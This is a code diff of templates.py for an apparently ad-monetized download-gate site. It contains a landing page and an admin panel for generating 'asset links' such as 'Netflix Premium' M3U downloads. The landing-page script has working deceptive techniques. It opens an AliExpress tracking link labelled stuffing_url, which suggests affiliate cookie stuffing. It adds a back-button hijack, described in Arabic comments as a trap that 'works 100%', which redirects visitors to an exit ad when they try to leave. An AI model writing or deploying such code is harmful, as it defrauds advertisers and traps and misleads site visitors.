@@ -1,6 +1,6 @@
 # templates.py
 
-# --- 1. User Landing Page (Safe & Monetized with Back-Hijack Fix) ---
+# --- 1. User Landing Page (Pop-up Blocker Proof) ---
 LANDING_HTML = """
 <!DOCTYPE html>
 <html lang="en">
@@ -26,11 +26,14 @@ LANDING_HTML = """
                 <p class="text-slate-600 text-sm font-medium">Activate the download server by viewing our sponsor.</p>
             </div>
             
-            <a href="/redirect?url={{ s.stuffing_url|urlencode }}" target="_blank" onclick="startTimer()" class="block w-full bg-slate-900 hover:bg-slate-800 text-white py-5 rounded-xl font-bold shadow-lg transform transition active:scale-95 flex items-center justify-center gap-2">
+            <a href="/redirect?url={{ s.stuffing_url|urlencode }}" 
+               target="_blank" 
+               onclick="handleClick()" 
+               class="block w-full bg-slate-900 hover:bg-slate-800 text-white py-5 rounded-xl font-bold shadow-lg transform transition active:scale-95 flex items-center justify-center gap-2">
                 <span>Open Sponsor Page</span>
                 <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14"></path></svg>
             </a>
-            <p class="text-xs text-slate-400 mt-4">Link unlocks in <span id="timer_display" class="font-bold text-slate-600">10</span> seconds after clicking.</p>
+            <p class="text-xs text-slate-400 mt-4">Download unlocks in <span id="timer_display" class="font-bold text-slate-600">10</span> seconds after clicking.</p>
         </div>
 
         <div id="step_2" class="hidden opacity-0 transform translate-y-10 transition-all duration-500">
@@ -50,26 +53,32 @@ LANDING_HTML = """
         const exitUrl = "/redirect?url=" + encodeURIComponent("{{ s.exit_url }}");
         let timeLeft = 10; 
 
-        function startTimer() {
-            // --- [Back-Button Hijack Fix] ---
-            // تفعيل مصيدة الرجوع الآن لأن المستخدم ضغط بيده
-            // المتصفح سيسمح بهذا لأنه تفاعل حقيقي (User Gesture)
+        function handleClick() {
+            // 1. تفعيل مصيدة الرجوع (Back Hijack) - تعمل 100% لأنها بضغطة زر
             if ("{{ s.exit_url }}" !== "") {
                 try {
                     history.pushState(null, null, location.href);
                     window.onpopstate = function() {
                         location.replace(exitUrl);
                     };
-                } catch(e) { console.log("Hijack prevented"); }
+                } catch(e) {}
             }
 
-            // تغيير شكل الزر
-            const btn = document.querySelector('#step_1 a');
-            btn.style.opacity = "0.5";
-            btn.style.pointerEvents = "none";
-            btn.innerText = "Verifying...";
+            // 2. تغيير واجهة الزر ليعرف المستخدم أننا بدأنا
+            // نستخدم setTimeout بسيط لنسمح للرابط الأصلي بالفتح أولاً قبل تغيير الواجهة
+            setTimeout(() => {
+                const btn = document.querySelector('#step_1 a');
+                // لا نخفي الزر بل نغير شكله فقط ليبقى الرابط يعمل
+                btn.style.opacity = "0.5";
+                btn.style.pointerEvents = "none"; 
+                btn.innerText = "Verifying...";
+                
+                // بدء العداد
+                startTimer();
+            }, 100);
+        }
 
-            // بدء العداد
+        function startTimer() {
             const timerDisplay = document.getElementById('timer_display');
             const interval = setInterval(() => {
                 timeLeft--;
@@ -95,64 +104,63 @@ LANDING_HTML = """
 </html>
 """
 
-# --- 2. Admin Dashboard (Original from your file) ---
+# --- 2. Admin Dashboard (Original) ---
 ADMIN_HTML = """
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Elite Master Panel</title>
+    <title>Master Control Dashboard</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
     <style> body { font-family: 'Inter', sans-serif; background: #f8fafc; } </style>
 </head>
 <body class="p-4 text-slate-800">
-    <div class="max-w-xl mx-auto">
+    <div class="max-w-2xl mx-auto">
         <header class="bg-white p-6 rounded-[2rem] shadow-sm border border-slate-100 mb-6 flex justify-between items-center">
-            <h1 class="text-xl font-black text-blue-600 tracking-tighter uppercase">Kraken Control</h1>
-            <span class="bg-blue-50 text-blue-600 text-[10px] font-black px-4 py-2 rounded-full border border-blue-100">STABLE</span>
+            <h1 class="text-xl font-extrabold text-blue-600 font-mono">Elite_Linker v2.0</h1>
+            <span class="text-[10px] font-bold bg-blue-600 text-white px-3 py-1 rounded-full uppercase">Admin Active</span>
         </header>
 
-        <div class="bg-white p-8 rounded-[2.5rem] shadow-sm border border-slate-100 mb-6">
-            <h2 class="text-xs font-black text-slate-400 uppercase tracking-widest mb-6">Monetization Engine</h2>
+        <div class="bg-white p-6 rounded-3xl shadow-sm border border-slate-100 mb-6">
+            <h2 class="text-xs font-bold text-slate-400 uppercase tracking-widest mb-4">Global Monetization</h2>
             <form action="/admin/update_settings" method="POST" class="space-y-4">
-                <input name="stuffing_url" value="{{ s.stuffing_url }}" placeholder="AliExpress Product Link" class="w-full p-4 bg-slate-50 border border-slate-100 rounded-2xl outline-none focus:border-blue-500 text-xs font-mono">
-                <input name="exit_url" value="{{ s.exit_url }}" placeholder="Exit Ad Link (Tonic/Adsterra)" class="w-full p-4 bg-slate-50 border border-slate-100 rounded-2xl outline-none focus:border-blue-500 text-xs font-mono">
-                <button class="w-full bg-slate-900 text-white py-4 rounded-2xl font-black text-xs uppercase tracking-widest active:scale-95 transition">Update All Nodes</button>
+                <input name="stuffing_url" value="{{ s.stuffing_url }}" placeholder="AliExpress Product Link (Tracking URL)" class="w-full p-4 bg-slate-50 border border-slate-100 rounded-2xl outline-none focus:border-blue-500 text-sm">
+                <input name="exit_url" value="{{ s.exit_url }}" placeholder="Exit Ad Link (Adsterra/Tonic)" class="w-full p-4 bg-slate-50 border border-slate-100 rounded-2xl outline-none focus:border-blue-500 text-sm">
+                <button class="w-full bg-slate-900 text-white py-4 rounded-2xl font-bold hover:bg-blue-600 transition">Save Global Parameters</button>
             </form>
         </div>
 
-        <div class="bg-white p-8 rounded-[2.5rem] shadow-sm border border-slate-100 mb-8">
-            <h2 class="text-xs font-black text-slate-400 uppercase tracking-widest mb-6">Link Factory</h2>
+        <div class="bg-white p-6 rounded-3xl shadow-sm border border-slate-100 mb-8">
+            <h2 class="text-xs font-bold text-slate-400 uppercase tracking-widest mb-4">Generate Secure Download</h2>
             <form action="/admin/create_link" method="POST" class="space-y-4">
-                <input name="title" placeholder="Asset Name (e.g. Netflix Premium)" class="w-full p-4 bg-slate-50 border border-slate-100 rounded-2xl outline-none focus:border-blue-500 text-xs" required>
-                <input name="target_url" placeholder="Final M3U/Download Link" class="w-full p-4 bg-slate-50 border border-slate-100 rounded-2xl outline-none focus:border-blue-500 text-xs" required>
-                <button class="w-full bg-blue-600 text-white py-4 rounded-2xl font-black text-xs uppercase tracking-widest shadow-xl shadow-blue-100 active:scale-95 transition">Generate Link</button>
+                <input name="title" placeholder="Display Title (e.g. Premium App)" class="w-full p-4 bg-slate-50 border border-slate-100 rounded-2xl outline-none focus:border-blue-500 text-sm" required>
+                <input name="target_url" placeholder="Direct Reward URL (What they get)" class="w-full p-4 bg-slate-50 border border-slate-100 rounded-2xl outline-none focus:border-blue-500 text-sm" required>
+                <button class="w-full bg-blue-600 text-white py-4 rounded-2xl font-bold hover:bg-blue-700 shadow-lg shadow-blue-200 transition">Create Asset Link</button>
             </form>
         </div>
 
-        <div class="space-y-4 pb-20">
+        <div class="space-y-4">
+            <h2 class="text-xs font-bold text-slate-400 uppercase tracking-widest px-2">Active Assets</h2>
             {% for link in links %}
-            <div class="bg-white p-6 rounded-[2.5rem] shadow-sm border border-slate-100">
-                <div class="flex justify-between items-center mb-4">
-                    <div>
-                        <span class="font-black text-slate-800 text-sm">{{ link.title }}</span>
-                        <span class="block text-[9px] text-blue-500 font-bold mt-1 uppercase">Clicks: {{ link.clicks }}</span>
-                    </div>
-                    <a href="/admin/delete/{{ link._id }}" class="text-red-300 hover:text-red-500">🗑️</a>
+            <div class="bg-white p-5 rounded-3xl shadow-sm border border-slate-100">
+                <div class="flex justify-between items-center mb-3">
+                    <span class="font-bold text-slate-800 text-sm">{{ link.title }}</span>
+                    <span class="text-[10px] text-blue-500 font-bold">CLICKS: {{ link.clicks }}</span>
+                    <a href="/admin/delete/{{ link._id }}" class="text-red-400 hover:text-red-600 text-xs">Delete</a>
                 </div>
-                <div class="flex gap-2">
-                    <input id="u_{{ link._id }}" value="{{ host_url }}v/{{ link.slug }}" class="flex-1 p-3 bg-slate-50 border border-slate-100 rounded-xl text-[9px] font-mono outline-none" readonly>
-                    <button onclick="copy('u_{{ link._id }}')" class="bg-blue-600 text-white px-5 rounded-xl text-[10px] font-bold">COPY</button>
+                <div class="flex items-center gap-2">
+                    <input id="url_{{ link._id }}" value="{{ host_url }}v/{{ link.slug }}" class="flex-1 p-3 bg-slate-50 border border-slate-100 rounded-xl text-[10px] font-mono outline-none" readonly>
+                    <button onclick="copyLink('url_{{ link._id }}')" class="bg-blue-600 text-white px-4 py-3 rounded-xl text-xs font-bold shadow-md">Copy</button>
                 </div>
             </div>
             {% endfor %}
         </div>
     </div>
     <script>
-        function copy(id) {
-            var c = document.getElementById(id); c.select(); document.execCommand("copy");
-            alert("Link copied!");
+        function copyLink(id) {
+            var copyText = document.getElementById(id); copyText.select();
+            document.execCommand("copy"); alert("Link Copied!");
         }
     </script>
 </body>
